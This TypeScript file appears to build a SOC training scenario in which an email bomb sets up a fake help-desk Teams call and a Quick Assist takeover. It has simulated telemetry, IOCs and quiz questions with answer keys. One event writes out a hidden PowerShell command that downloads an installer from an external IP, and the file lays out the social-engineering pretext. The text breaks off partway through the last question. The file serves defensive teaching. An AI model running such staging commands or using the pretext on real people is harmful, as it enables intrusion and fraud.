/**
 * Scenario pack: "Email Bomb to Fake Help Desk — Quick Assist Takeover"
 *
 * INTERMEDIATE tier. The modern Black Basta / ransomware-precursor social-
 * engineering chain, in three acts. First the operator EMAIL-BOMBS the target:
 * within minutes the mailbox of an accounts-payable clerk fills with hundreds of
 * genuine newsletter and subscription-confirmation messages. Not one of them is
 * malware — each is a real double-opt-in email from a real service, scanned
 * clean by Defender for Office 365. The volume is the whole point. Then, with the
 * user overwhelmed and rattled, someone rings her over Microsoft Teams claiming
 * to be the internal Service Desk — "we can see you're being spammed, let us stop
 * it" — and walks her through launching the built-in Windows Quick Assist tool
 * and handing over control. Once the operator has the keyboard, hands-on
 * discovery and follow-on tooling begin.
 *
 * The teaching arc has three beats: the email flood is the SIGNATURE (a burst of
 * individually-benign mail from many distinct senders), the unsolicited callback
 * is the TURN (the pretext that the flood was engineered to justify), and the
 * Quick Assist remote session is the COMPROMISE. A student who fixates on the
 * mail — quarantining senders, tuning spam rules — misses that the flood was
 * never the attack; it was the bait for it.
 *
 * DISTINCT from the vishing-RMM pack: that case opened with a cold call and a
 * third-party RMM (AnyDesk). Here the LEAD INDICATOR is the email bomb, the
 * remote tool is Microsoft's own signed Quick Assist, and the discovery set and
 * victim differ. The two packs share a lesson — a legitimate remote-support tool
 * is judged by context — but reach it from opposite openings.
 *
 * The benign control (evt_ebh_00) is the sanctioned mirror: the same signed
 * Quick Assist binary, run by a known internal technician against a ticket the
 * user opened herself the day before — and with NO preceding mail flood and NO
 * unsolicited contact. Same "remote session" shape, opposite verdict. The
 * email bomb plus the out-of-the-blue offer is the discriminator, not the tool.
 *
 * SOURCES: microsoft-defender-office365 (the inbound flood — a high count of
 * distinct legitimate senders to one recipient in a short window, each clean),
 * microsoft-365 (a corroborating Exchange mail-audit event), servicenow-itsm
 * (the help-desk record where the user reports the spam and the outreach),
 * crowdstrike-falcon (the Quick Assist process, its discovery children, and the
 * alert-grade detection).
 *
 * Covers T1566.004 (Spearphishing Voice) for the callback, T1219 (Remote Access
 * Software) for Quick Assist, T1082 / T1033 / T1069.001 (discovery) and
 * T1059.001 (PowerShell). The email flood itself is framed as social-engineering
 * setup (resource development / phishing, T1585 / T1566) and is left as a benign
 * observation — the individual messages are real, clean mail.
 *
 * NOTE: register in scenarios.ts with difficulty "intermediate" (the
 * ScenarioBundle itself carries no difficulty field).
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildEmailBombHelpdeskScenario(
  scenarioId = "email-bomb-helpdesk-2026",
): ScenarioBundle {
  const B = new Date("2026-08-25T09:14:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One incident — the whole email-bomb-to-takeover chain is a single case.
  const INCIDENT = "inc:ebh:1";

  // The company, its AD estate, and the socially-engineered clerk.
  const domain = "NORTHWIND";
  const victim = {
    sam: "j.mercer",
    email: "j.mercer@northwind.com",
    upn: "j.mercer@northwind.com",
    title: "Accounts Payable Specialist",
    hostname: "WKS-NW-118",
    ip: "10.30.4.118",
  };

  // The benign control: a sanctioned Quick Assist session run by a known
  // internal technician against a ticket the user opened herself — no flood.
  const benign = {
    sam: "t.osei",
    email: "t.osei@northwind.com",
    hostname: "WKS-NW-072",
    ip: "10.30.4.72",
  };
  const benignTech = "r.kline";
  const benignTicket = "INC0210044";

  // The help-desk record where the user reports the flood and the outreach.
  const reportTicket = "INC0210318";

  // The external host the operator stages follow-on tooling from, and the tool.
  const stagingIp = "185.220.101.44";
  const payloadName = "nw-support-agent.msi";
  const payloadHash = makeSha256("email_bomb_helpdesk_quickassist_staged_agent_msi_2026");
  const payloadPath = "C:\\Windows\\System32\\quickassist.exe";

  const falconSensor = "c4a91f7e2b6d40518e3c7a92f1d0b6a5";
  const reportId = "90417265";

  // A handful of the real subscription services whose confirmation mail made up
  // the flood — each a genuine double-opt-in message, scanned clean.
  const floodSample = [
    { sender: "no-reply@substack.com",          subject: "Confirm your subscription to keep reading" },
    { sender: "confirm@newsletters.nytimes.com", subject: "One more step: confirm your email address" },
    { sender: "hello@mail.notion.so",            subject: "Verify your email to finish signing up" },
    { sender: "newsletter@list.wired.com",       subject: "Please confirm you want to subscribe" },
    { sender: "updates@e.linkedin.com",          subject: "Confirm your newsletter preferences" },
  ];

  const events: TelemetryEvent[] = [
    // ─────────────────────────────────────────────────────────────────────
    // 0. BENIGN CONTROL — a SANCTIONED Quick Assist remote-support session.
    //    The SAME signed Microsoft binary as the attack, run by a known
    //    internal technician against a ticket the user opened herself, with
    //    NO mail flood and NO unsolicited contact. Same shape, opposite verdict.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_00_benign_quickassist",
      ts: "2026-08-24T15:20:00Z",
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: benign.hostname,
      user_email: benign.email,
      src_ip: benign.ip,
      severity: "informational",
      expected_verdict: "fp",
      fp_explanation:
        `The control case for the whole scenario. This is ALSO the signed Microsoft Quick Assist tool opening a remote session — structurally identical to the attack — yet entirely legitimate. Three things make it sanctioned: it maps to ${benignTicket}, a ticket ${benign.sam} opened herself through the portal the day before; it was driven by a known internal technician (${benignTech}) whose account is in the IT Support group; and there was no preceding mail flood and no out-of-the-blue offer of help. Compare every one of those against the Quick Assist activity on ${victim.hostname}. A student who clears a remote-support session because "Quick Assist is a built-in Microsoft tool" will wrongly clear the attack too — the tool is the same; only the context differs.`,
      description:
        `The built-in Quick Assist tool started on ${benign.hostname} at 15:20 the previous afternoon for a sanctioned support session. It maps to help-desk ticket ${benignTicket}, opened by the machine's own user, and the session was driven by internal technician ${benignTech}.`,
      process: {
        name: "quickassist.exe",
        pid: 5320,
        path: "C:\\Windows\\System32\\quickassist.exe",
        parent_name: "explorer.exe",
        parent_pid: 4044,
        cmdline: "\"C:\\Windows\\System32\\quickassist.exe\"",
        user: `${domain}\\${benign.sam}`,
        integrity: "medium",
        hash: { sha256: makeSha256("email_bomb_helpdesk_quickassist_signed_binary_2026") },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": benign.hostname,
        "event.action": "process_created",
        "process.name": "quickassist.exe",
        "process.pid": "5320",
        "process.executable": "C:\\Windows\\System32\\quickassist.exe",
        "process.command_line": "\"C:\\Windows\\System32\\quickassist.exe\"",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "4044",
        "process.code_signature.status": "trusted",
        "process.code_signature.subject_name": "Microsoft Windows",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${benign.sam}`,
        "host.name": benign.hostname,
        "host.ip": benign.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 1. THE EMAIL BOMB — the lead indicator. A burst of inbound subscription
    //    confirmations from many distinct legitimate senders to one mailbox in
    //    minutes. Defender for Office 365 delivered every one of them CLEAN.
    //    The count is stated over a window in the description (no rate field).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_01_flood_burst",
      ts: T(0),
      source: "email_gateway",
      vendor: "Microsoft Defender for Office 365",
      event_type: "email_received",
      user_email: victim.email,
      severity: "medium",
      description:
        `Defender for Office 365 delivered 312 inbound subscription and newsletter confirmation emails to ${victim.email} between 09:14 and 09:28 — a burst from 297 distinct external senders. Every message was scanned and delivered clean; none carried malware or a phishing verdict. Shown here is one representative message of the burst.`,
      raw: {
        "data.office365.Workload": "Exchange",
        "data.office365.Operation": "MessageDelivered",
        "data.office365.Directionality": "Inbound",
        "data.office365.Sender": floodSample[0].sender,
        "data.office365.SenderIp": "149.72.148.30",
        "data.office365.Recipients": victim.email,
        "data.office365.Subject": floodSample[0].subject,
        "data.office365.DeliveryAction": "Delivered",
        "data.office365.SpamConfidenceLevel": "1",
        "data.office365.PhishConfidenceLevel": "0",
        "data.office365.ThreatType": "None",
        "data.office365.NetworkMessageId": "b1e0f4a2-7c31-4d8e-9a26-3f5c1d902a11",
        "data.office365.InternetMessageId": "<0101019a2c1f7b40-substack-confirm@substack.com>",
        "rule.description": "Office 365: Message delivered to mailbox",
        "rule.level": "3",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 2. FLOOD SAMPLE #2 — a second, entirely different legitimate sender in
    //    the same burst, to show the "many distinct senders" shape. Also clean.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_02_flood_sample",
      ts: T(3 * MIN),
      source: "email_gateway",
      vendor: "Microsoft Defender for Office 365",
      event_type: "email_received",
      user_email: victim.email,
      severity: "low",
      description:
        `Another confirmation message in the same window: a double-opt-in newsletter sign-up notice from a second unrelated service, delivered clean to ${victim.email}. Dozens more from unrelated senders arrived alongside it.`,
      raw: {
        "data.office365.Workload": "Exchange",
        "data.office365.Operation": "MessageDelivered",
        "data.office365.Directionality": "Inbound",
        "data.office365.Sender": floodSample[1].sender,
        "data.office365.SenderIp": "170.10.129.144",
        "data.office365.Recipients": victim.email,
        "data.office365.Subject": floodSample[1].subject,
        "data.office365.DeliveryAction": "Delivered",
        "data.office365.SpamConfidenceLevel": "0",
        "data.office365.PhishConfidenceLevel": "0",
        "data.office365.ThreatType": "None",
        "data.office365.NetworkMessageId": "77c2a915-0b4e-42f1-8d6a-1c9e5b3407d2",
        "data.office365.InternetMessageId": "<20260825091700.nyt-confirm@newsletters.nytimes.com>",
        "rule.description": "Office 365: Message delivered to mailbox",
        "rule.level": "3",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 3. MAIL-AUDIT CORROBORATION — the Unified Audit Log shows the user's own
    //    reaction: she created an inbox rule to sweep the confirmation mail into
    //    a folder. A benign, human response that corroborates the flood.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_03_inbox_rule_reaction",
      ts: T(11 * MIN),
      source: "o365",
      vendor: "Microsoft 365",
      event_type: "policy_modification",
      user_email: victim.email,
      severity: "low",
      description:
        `The Exchange audit log recorded ${victim.sam} creating an inbox rule named "Newsletters" that moves messages whose subject contains "confirm" into a subfolder — the clerk trying to stem the flood of incoming mail herself.`,
      raw: {
        "office365.Workload": "Exchange",
        "office365.Operation": "New-InboxRule",
        "office365.RecordType": "1",
        "office365.UserId": victim.upn,
        "office365.ClientIP": victim.ip,
        "office365.ResultStatus": "Succeeded",
        "office365.Parameters": "Name=Newsletters; SubjectContainsWords=confirm,subscribe; MoveToFolder=Newsletters",
        "office365.CreationTime": T(11 * MIN),
        "rule.description": "Office 365: New inbox rule created by mailbox owner",
        "rule.level": "3",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 4. THE HELP-DESK RECORD — the user reports the spam AND the out-of-the-
    //    blue Teams call from a "Service Desk" offering to stop it and asking
    //    to start Quick Assist. This is the callback / voice pretext (T1566.004).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_04_report_ticket",
      ts: T(16 * MIN),
      source: "soar",
      vendor: "ServiceNow ITSM",
      event_type: "policy_modification",
      severity: "low",
      mitre_technique: "T1566.004",
      mitre_tactic: "Initial Access",
      user_email: victim.email,
      description:
        `Ticket ${reportTicket} was raised by ${victim.sam}: her mailbox was flooded with hundreds of newsletter confirmations, and shortly after, a person reached her over a Microsoft Teams call saying they were the Service Desk and would "stop the spam" if she started Quick Assist and shared the code. No IT-initiated ticket exists for that outreach.`,
      raw: {
        "servicenow.table": "incident",
        "servicenow.number": reportTicket,
        "servicenow.short_description": "flooded with spam emails",
        "servicenow.description":
          `Caller ${victim.sam} reports several hundred newsletter and subscription confirmation emails arriving in a few minutes. Shortly after, a person contacted her via a Microsoft Teams call, stated they were from the IT Service Desk, and offered to stop the spam. Caller was asked to launch Quick Assist and read out the six-digit code to grant remote control. No Service Desk ticket was opened for that outreach and the caller is not listed in the IT staff directory.`,
        "servicenow.category": "Email",
        "servicenow.subcategory": "Spam",
        "servicenow.contact_type": "Self-service",
        "servicenow.priority": "3 - Moderate",
        "servicenow.urgency": "2 - High",
        "servicenow.impact": "3 - Low",
        "servicenow.state": "In Progress",
        "servicenow.caller_id": victim.email,
        "servicenow.opened_by": victim.email,
        "servicenow.assignment_group": "IT Service Desk",
        "servicenow.u_identity_verification": "Caller offering help not listed in IT staff directory; no outbound support ticket on record",
        "servicenow.u_verification_result": "Not verified",
        "servicenow.opened_at": "2026-08-25 09:30:00",
        "servicenow.sys_created_on": "2026-08-25 09:30:00",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 5. THE TAKEOVER — Quick Assist launches on the victim host. Falcon
    //    records it as a signed, trusted Microsoft binary. Legitimate tool,
    //    illegitimate context: no user-opened ticket, right after the flood
    //    and the unsolicited call (T1219).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_05_quickassist_exec",
      ts: T(19 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "high",
      mitre_technique: "T1219",
      mitre_tactic: "Command and Control",
      description:
        `${victim.sam} launched Quick Assist on ${victim.hostname} and shared the connection code with the caller. Falcon reports the binary as signed and trusted (Microsoft Windows). No user-opened support ticket exists for this session, and it started minutes after the mail burst and the Teams call.`,
      process: {
        name: "quickassist.exe",
        pid: 7712,
        path: "C:\\Windows\\System32\\quickassist.exe",
        parent_name: "explorer.exe",
        parent_pid: 3960,
        cmdline: "\"C:\\Windows\\System32\\quickassist.exe\"",
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: makeSha256("email_bomb_helpdesk_quickassist_signed_binary_2026") },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "event.action": "process_created",
        "process.name": "quickassist.exe",
        "process.pid": "7712",
        "process.executable": "C:\\Windows\\System32\\quickassist.exe",
        "process.command_line": "\"C:\\Windows\\System32\\quickassist.exe\"",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3960",
        "process.code_signature.status": "trusted",
        "process.code_signature.subject_name": "Microsoft Windows",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 6. DISCOVERY #1 — systeminfo. The operator's first move on the keyboard:
    //    profile the host (T1082). Spawned via cmd.exe under the Quick Assist
    //    session, not from the user's own shell.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_06_disc_systeminfo",
      ts: T(22 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "medium",
      mitre_technique: "T1082",
      mitre_tactic: "Discovery",
      description:
        `On ${victim.hostname}, Quick Assist's session spawned cmd.exe which ran "systeminfo" — enumerating the host's OS build, patch level and domain, spawned by the remote-support tool rather than by the user.`,
      process: {
        name: "systeminfo.exe",
        pid: 8020,
        path: "C:\\Windows\\System32\\systeminfo.exe",
        parent_name: "cmd.exe",
        parent_pid: 7980,
        cmdline: "systeminfo",
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "cmd.exe",
        "event.action": "process_created",
        "process.name": "systeminfo.exe",
        "process.pid": "8020",
        "process.executable": "C:\\Windows\\System32\\systeminfo.exe",
        "process.command_line": "systeminfo",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "7980",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 7. DISCOVERY #2 — quser. Who else is logged on to the host (T1033).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_07_disc_quser",
      ts: T(23 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        `cmd.exe on ${victim.hostname} ran "quser", listing the interactive sessions and logged-on users on the host — orienting the operator to who is present on the machine.`,
      process: {
        name: "quser.exe",
        pid: 8104,
        path: "C:\\Windows\\System32\\quser.exe",
        parent_name: "cmd.exe",
        parent_pid: 7980,
        cmdline: "quser",
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "cmd.exe",
        "event.action": "process_created",
        "process.name": "quser.exe",
        "process.pid": "8104",
        "process.executable": "C:\\Windows\\System32\\quser.exe",
        "process.command_line": "quser",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "7980",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 8. DISCOVERY #3 — net localgroup administrators. Enumerating who holds
    //    local admin on this host (T1069.001).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_08_disc_localadmins",
      ts: T(24 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "high",
      mitre_technique: "T1069.001",
      mitre_tactic: "Discovery",
      description:
        `cmd.exe on ${victim.hostname} ran "net localgroup administrators", listing the local Administrators group — reconnaissance a payments clerk's workstation has no routine reason to perform.`,
      process: {
        name: "net.exe",
        pid: 8188,
        path: "C:\\Windows\\System32\\net.exe",
        parent_name: "cmd.exe",
        parent_pid: 7980,
        cmdline: "net localgroup administrators",
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "cmd.exe",
        "event.action": "process_created",
        "process.name": "net.exe",
        "process.pid": "8188",
        "process.executable": "C:\\Windows\\System32\\net.exe",
        "process.command_line": "net localgroup administrators",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "7980",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 9. STAGING — a hidden PowerShell spawned by the Quick Assist session pulls
    //    a follow-on installer from a raw-IP host into a system path (T1059.001).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_09_powershell_stage",
      ts: T(27 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      dst_ip: stagingIp,
      dst_port: 443,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1059.001",
      mitre_tactic: "Execution",
      description:
        `A hidden-window PowerShell, spawned by the Quick Assist session on ${victim.hostname}, used Invoke-WebRequest to pull ${payloadName} from ${stagingIp} into a Windows folder — the operator staging follow-on tooling under cover of the remote session.`,
      process: {
        name: "powershell.exe",
        pid: 8360,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "cmd.exe",
        parent_pid: 7980,
        cmdline: `powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri http://${stagingIp}/agent/${payloadName} -OutFile C:\\Windows\\Temp\\${payloadName}"`,
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: payloadHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "cmd.exe",
        "event.action": "process_created",
        "process.name": "powershell.exe",
        "process.pid": "8360",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": `powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri http://${stagingIp}/agent/${payloadName} -OutFile C:\\Windows\\Temp\\${payloadName}"`,
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "7980",
        "process.hash.sha256": payloadHash,
        "process.integrity_level": "Medium",
        "destination.ip": stagingIp,
        "destination.port": "443",
        "network.transport": "tcp",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 10. THE DETECTION — Falcon raises the alert-grade detection that opened
    //     the case, tying the unsolicited Quick Assist session to the hands-on
    //     discovery burst. is_detection + edr_scope "hybrid" (host process tree
    //     AND the mail/ITSM context).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_ebh_10_falcon_detection",
      ts: T(29 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "critical",
      mitre_technique: "T1219",
      mitre_tactic: "Command and Control",
      is_detection: true,
      edr_scope: "hybrid",
      description:
        `Falcon raised a High detection on ${victim.hostname}: a Quick Assist session with no user-opened ticket spawned cmd.exe, systeminfo, quser, net.exe and a hidden PowerShell in quick succession — a remote operator profiling the host and staging tooling.`,
      process: {
        name: "quickassist.exe",
        pid: 7712,
        path: "C:\\Windows\\System32\\quickassist.exe",
        parent_name: "explorer.exe",
        parent_pid: 3960,
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.DetectName": "Quick Assist Session With Interactive Host Discovery",
        "crowdstrike.Tactic": "Command and Control",
        "crowdstrike.Technique": "Remote Access Software",
        "crowdstrike.SeverityName": "High",
        "crowdstrike.PatternDispositionDescription": "Detection, No Action",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "process.name": "quickassist.exe",
        "threat.tactic.name": "Command and Control",
        "threat.tactic.id": "TA0011",
        "threat.technique.name": "Remote Access Software",
        "threat.technique.id": "T1219",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
        "user.name": `${domain}\\${victim.sam}`,
        "event.outcome": "success",
      },
    },
  ];

  // Every event belongs to the one email-bomb-to-takeover incident.
  for (const e of events) e.incident_id = INCIDENT;

  const iocs: IOC[] = [
    {
      type: "host",
      value: victim.hostname, // WKS-NW-118 — the affected workstation
      first_seen: T(19 * MIN),
      last_seen: T(29 * MIN),
      reputation: "unknown",
      tags: ["affected", "workstation"],
    },
    {
      type: "user",
      value: victim.sam, // j.mercer — the socially-engineered account
      first_seen: T(0),
      last_seen: T(29 * MIN),
      reputation: "suspicious",
      tags: ["social-engineering-target", "hands-on-keyboard"],
    },
    {
      type: "ip",
      value: stagingIp, // 185.220.101.44 — the external host serving the tooling
      first_seen: T(27 * MIN),
      last_seen: T(27 * MIN),
      reputation: "malicious",
      tags: ["external", "tool-staging", "raw-ip-host"],
    },
    {
      type: "sha256",
      value: payloadHash, // the staged follow-on installer
      first_seen: T(27 * MIN),
      last_seen: T(27 * MIN),
      reputation: "malicious",
      tags: ["staged-tool", "follow-on"],
    },
    {
      type: "email",
      value: victim.email, // j.mercer@northwind.com — the flooded mailbox
      first_seen: T(0),
      last_seen: T(16 * MIN),
      reputation: "unknown",
      tags: ["target-mailbox", "flooded"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "How did the operator get hands-on control of WKS-NW-118? Read the ServiceNow record (evt_ebh_04) against the Quick Assist launch (evt_ebh_05) that follows it.",
      hint: "Look at who initiated the Teams contact, whether any user-opened ticket exists for it, and what the caller asked the clerk to do.",
      kind: "single",
      options: [
        { value: "callback_quickassist", label: "An out-of-the-blue Microsoft Teams call posing as the Service Desk talked the clerk into starting Quick Assist and reading out the code, handing the caller live control of her machine" },
        { value: "phish_link", label: "The clerk clicked a link in one of the newsletter emails, which silently installed a remote-control agent on the host in the background" },
        { value: "exploit", label: "The operator exploited an unpatched flaw exposed by the mail server to drop a remote-control tool onto the host, with no user involvement" },
        { value: "insider", label: "The clerk deliberately opened the session to give an outside party covert access, making this a witting-insider case" },
      ],
      answer: "callback_quickassist",
      xp: 55,
      explanation:
        "The ticket is the context that makes sense of the takeover. The clerk reports that after the mail burst a person reached her over a Teams call claiming to be the Service Desk, offered to stop the spam, and asked her to launch Quick Assist and share the six-digit code — and no IT-initiated ticket exists for that outreach. Minutes later evt_ebh_05 shows Quick Assist starting on her host. That is callback/voice-phishing initial access (T1566.004): the operator never touched the machine, they talked the user into granting control. (b) invents a click the logs do not show — the flood messages were delivered clean and nothing was installed from them. (c) invents an exploit; the tool is Windows' own Quick Assist, started interactively by the user. (d) misreads a deceived victim as a malicious insider.",
    },
    {
      id: "q2",
      prompt:
        "Hundreds of confirmation emails hit the mailbox, yet Defender for Office 365 delivered every one of them clean. Why is the flood the OPENING MOVE of the attack rather than the attack itself?",
      hint: "Ask what each individual message is, what the volume achieves, and where the actual compromise happens in the timeline.",
      kind: "single",
      options: [
        { value: "pretext_for_call", label: "Each note is a real double-opt-in message, so none earns a bad verdict; the volume exists to overwhelm the clerk and manufacture a believable reason for the fake help offer — the real breach is the remote session, not the mail" },
        { value: "hidden_malware", label: "One of the confirmation emails secretly carried the malware, and the other hundreds were sent purely to bury that single malicious message so it would not be noticed" },
        { value: "mail_dos", label: "The flood is itself the attack: it is a denial-of-service against the mail platform meant to knock the mailbox and the mail server offline, and nothing beyond it matters" },
        { value: "filter_bypass", label: "The sheer count was designed to exhaust the spam filter so that later phishing mail would slip through the weakened defenses unchecked" },
      ],
      answer: "pretext_for_call",
      xp: 70,
      explanation:
        "This is the heart of the scenario. Every message in the burst is a genuine subscription confirmation from a real service — which is exactly why Defender delivers them clean and why quarantining senders leads nowhere. The flood's job is psychological and logistical: swamp the target so she is rattled and primed, and create a plausible problem that a 'helpful' caller can then offer to fix. The compromise is the Quick Assist session the pretext unlocks, not the mail. (b) invents a hidden payload — the messages are individually clean and no attachment or link executes. (c) treats the flood as the goal; the timeline shows it is the setup for a remote takeover. (d) invents a later phishing wave that never arrives; the follow-through is a phone-driven remote session, not more mail.",
    },
    {
      id: "q3",
      prompt:
        "Falcon reports quickassist.exe as signed and trusted (Microsoft Windows) — it is a genuine, built-in Windows tool. So why is it correct to treat this session as malicious?",
      hint: "A tool is not the same as its use. Contrast this session with the sanctioned one in evt_ebh_00.",
      kind: "single",
      options: [
        { value: "context", label: "The malice is the context, not the file: a remote session with no user-opened ticket, begun on the word of an unsolicited caller right after a mail flood, and immediately followed by host and group enumeration" },
        { value: "bad_hash", label: "The binary's hash matches a known-malicious sample in threat intel, so despite the Microsoft signature it is confirmed to be tampered malware" },
        { value: "fake_sig", label: "The code signature is counterfeit — the operator swapped in a lookalike quickassist.exe — and Falcon marking it trusted is a validation failure" },
        { value: "all_remote", label: "Any remote-support tool running on a workstation is malicious by definition, so the verdict does not depend on the surrounding events at all" },
      ],
      answer: "context",
      xp: 65,
      explanation:
        "A trusted signature tells you the file is really Microsoft's Quick Assist — it says nothing about whether this use of it is authorised. Every signal that matters here is contextual: there is no ticket the user opened for the session, it began because an unsolicited caller asked for it, it started moments after the engineered mail flood, and within minutes it spawns systeminfo, quser and net localgroup administrators. (b) invents intel that is absent — the binary is the real, clean tool. (c) is refuted by the record: the signature is genuinely trusted, not forged. (d) over-corrects into a rule that would also condemn the sanctioned Quick Assist session in evt_ebh_00 — the control exists precisely to show the same tool can be entirely legitimate when the provenance is accountable.",
    },
    {
      id: "q4",
      prompt:
        "The day before, a Quick Assist session ran on WKS-NW-072 (evt_ebh_00) — the same signed tool opening a remote session — and it is benign. Which combination of facts separates it from the session on WKS-NW-118?",
      hint: "Compare the ticket's origin, who was operating the session, and what happened in the mailbox beforehand.",
      kind: "single",
      options: [
        { value: "ticket_tech_noflood", label: "The WKS-NW-072 session maps to a ticket the user opened herself and was run by a known internal technician, with no mail burst and no unsolicited offer before it; the WKS-NW-118 session inverts all three" },
        { value: "tls_channel", label: "The benign session was encrypted end to end while the malicious one ran in the clear, and that transport difference is what makes one safe and the other not" },
        { value: "severity_tag", label: "The benign event is labelled informational and the malicious ones are labelled high, and that severity labelling is what distinguishes them" },
        { value: "off_hours", label: "The benign session ran during business hours and the malicious one ran overnight, which is the only meaningful difference between the two" },
      ],
      answer: "ticket_tech_noflood",
      xp: 60,
      explanation:
        "Both are the same class of activity, so the verdict turns on provenance. The WKS-NW-072 session maps to INC0210044 — a ticket its own user opened through the portal — was driven by internal technician r.kline, and had no mail flood and no cold offer of help before it; every link is accountable. The WKS-NW-118 session inverts each: no user-opened ticket, an external caller reached through a Teams call, and an engineered mail burst as the setup. (b) is a red herring — Quick Assist tunnels the same way in both, and encryption is not what makes a session legitimate. (c) reverses cause and effect: the severity labels are a result of the analysis, not evidence for it. (d) invents a timing contrast the records do not show and that would not be decisive anyway.",
    },
    {
      id: "q5",
      prompt:
        "You are scoping containment. Quick Assist is a legitimate Microsoft tool, the operator has profiled the host and staged an installer from a raw-IP address, and access came through a fake help-desk call. Which response fits the evidence?",
      hint: "The tool being legitimate does not make the session safe. Think about the live channel, the account, the staged file, and the way in.",
      kind: "single",
      options: [
